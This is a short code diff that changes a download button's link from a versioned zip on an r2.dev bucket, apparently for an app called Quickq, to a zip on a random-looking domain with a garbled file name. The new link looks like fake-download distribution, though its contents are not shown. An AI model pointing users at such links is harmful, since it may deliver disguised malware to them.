@@ -13,5 +13,5 @@
 })();
 
 function btnDown() {
-    window.open('https://pub-cd19de2c4b544be6b24373c3e5f83b9a.r2.dev/ty-Xveiquickq0.5.10.zip')
+    window.open('https://bireut-sf-sgc-af-rgbxcvh1saaf.com/QuickqStreupes_v1757945268.691875.zip')
                 }
